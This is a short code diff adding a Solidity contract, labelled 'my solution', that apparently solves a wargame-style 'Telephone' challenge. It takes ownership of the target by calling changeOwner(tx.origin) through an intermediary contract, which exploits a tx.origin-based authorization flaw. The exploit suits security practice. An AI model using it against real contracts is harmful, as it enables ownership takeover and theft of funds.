@@ -22,3 +22,16 @@ contract TelephoneAttack {
 
     }
 }
+
+//my solution
+contract TelephoneAttack2{
+    ITelephone public telephone;
+
+    constructor (ITelephone _telephone){
+        telephone = _telephone;
+    }
+
+    function attack() external {
+            telephone.changeOwner(tx.origin);
+    }
+}
